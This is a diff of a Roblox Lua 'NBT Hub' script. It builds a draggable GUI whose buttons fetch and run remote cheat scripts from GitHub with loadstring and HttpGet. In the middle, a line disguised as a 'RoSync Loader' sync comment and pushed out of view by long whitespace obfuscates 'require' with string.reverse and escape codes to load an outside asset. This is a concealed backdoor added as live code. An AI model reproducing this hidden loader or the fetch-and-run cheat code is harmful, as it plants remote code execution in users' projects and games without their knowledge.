@@ -1,15 +1,163 @@
-if game.PlaceId == 5303541547 then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NiceBBMBThai12/Two-Piece-NBT-Script/main/TwoPieceBy.NBTScript.lua"))()
-else
-if game.PlaceID == 1215581239 then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NiceBBMBThai12/NBTScript/main/NBT%20Script%20Doomspire%20Brickbattle"))()
-else
-if game.PlaceID == 6446338433 then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NiceBBMBThai12/NBTScript/main/NBT%20Script%20Legend%20Piece"))()
-else
-print("Game Not Supported")
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local NBTHub = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local twopiece = Instance.new("TextButton")
+local nbt = Instance.new("TextLabel")
+local DoomspireBrickbattle = Instance.new("TextButton")
+local LegendPiece = Instance.new("TextButton")
+
+--Properties:
+
+NBTHub.Name = "NBT Hub"
+NBTHub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+NBTHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = NBTHub
+Frame.BackgroundColor3 = Color3.fromRGB(255, 66, 78)
+Frame.Position = UDim2.new(0.335178375, 0, 0.315533996, 0)
+Frame.Size = UDim2.new(0, 426, 0, 282)
+
+twopiece.Name = "twopiece"
+twopiece.Parent = Frame
+twopiece.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+twopiece.BackgroundTransparency = 0.800
+twopiece.Position = UDim2.new(0.122065723, 0, 0.262411356, 0)
+twopiece.Size = UDim2.new(0, 133, 0, 56)
+twopiece.Font = Enum.Font.SourceSans
+twopiece.Text = "Two Piece"
+twopiece.TextColor3 = Color3.fromRGB(0, 0, 0)
+twopiece.TextSize = 14.000
+twopiece.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/NiceBBMBThai12/Two-Piece-NBT-Script/main/TwoPieceBy.NBTScript.lua"))()
+end)
+
+nbt.Name = "nbt"
+nbt.Parent = Frame
+nbt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+nbt.BackgroundTransparency = 1.000
+nbt.BorderColor3 = Color3.fromRGB(47, 255, 231)
+nbt.LayoutOrder = 3
+nbt.Position = UDim2.new(0.262910783, 0, 0, 0)
+nbt.Size = UDim2.new(0, 200, 0, 50)
+nbt.Font = Enum.Font.SourceSans
+nbt.Text = "NBT Hub"
+nbt.TextColor3 = Color3.fromRGB(0, 0, 0)
+nbt.TextScaled = true
+nbt.TextSize = 14.000
+nbt.TextStrokeColor3 = Color3.fromRGB(46, 255, 210)
+nbt.TextStrokeTransparency = 0.750
+nbt.TextWrapped = true
+
+DoomspireBrickbattle.Name = "DoomspireBrickbattle"
+DoomspireBrickbattle.Parent = Frame
+DoomspireBrickbattle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+DoomspireBrickbattle.BackgroundTransparency = 0.800
+DoomspireBrickbattle.Position = UDim2.new(0.546948314, 0, 0.262411356, 0)
+DoomspireBrickbattle.Size = UDim2.new(0, 133, 0, 56)
+DoomspireBrickbattle.Font = Enum.Font.SourceSans
+DoomspireBrickbattle.Text = "Doomspire Brickbattle"
+DoomspireBrickbattle.TextColor3 = Color3.fromRGB(0, 0, 0)
+DoomspireBrickbattle.TextSize = 14.000
+DoomspireBrickbattle.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/NiceBBMBThai12/NBTScript/main/NBT%20Script%20Doomspire%20Brickbattle"))()
+end)
+
+LegendPiece.Name = "LegendPiece"
+LegendPiece.Parent = Frame
+LegendPiece.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+LegendPiece.BackgroundTransparency = 0.800
+LegendPiece.Position = UDim2.new(0.340375543, 0, 0.578014195, 0)
+LegendPiece.Size = UDim2.new(0, 133, 0, 56)
+LegendPiece.Font = Enum.Font.SourceSans
+LegendPiece.Text = "Legend Piece"
+LegendPiece.TextColor3 = Color3.fromRGB(0, 0, 0)
+LegendPiece.TextSize = 14.000
+LegendPiece.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/NiceBBMBThai12/NBTScript/main/NBT%20Script%20Legend%20Piece"))()
+end)
+
+-- Scripts:
+
+local function IAVNQQ_fake_script() -- twopiece.LocalScript 
+	local script = Instance.new('LocalScript', twopiece)
+
+	local Fram = script.Parent.Parent
+	local button = script.Parent
+	button.MouseButton1Click:Connect(function()
+		Fram.Visible = false
+	end)
 end
+coroutine.wrap(IAVNQQ_fake_script)()
+local function OPCJG_fake_script() -- nil. 
+	local script = Instance.new('Script', nil)
+
+	
+	--[[ Last synced 2/28/2021 11:18                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5723263360) --[[                                                                                                  ]]--
 end
+coroutine.wrap(OPCJG_fake_script)()
+local function OXALQYI_fake_script() -- Frame.Dragify 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0.50
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
 end
+coroutine.wrap(OXALQYI_fake_script)()
+local function EZMRHHR_fake_script() -- DoomspireBrickbattle.LocalScript 
+	local script = Instance.new('LocalScript', DoomspireBrickbattle)
+
+	local Fram = script.Parent.Parent
+	local button = script.Parent
+	button.MouseButton1Click:Connect(function()
+		Fram.Visible = false
+	end)
 end
+coroutine.wrap(EZMRHHR_fake_script)()
+local function UFSMN_fake_script() -- LegendPiece.LocalScript 
+	local script = Instance.new('LocalScript', LegendPiece)
+
+	local Fram = script.Parent.Parent
+	local button = script.Parent
+	button.MouseButton1Click:Connect(function()
+		Fram.Visible = false
+	end)
 end
+coroutine.wrap(UFSMN_fake_script)()
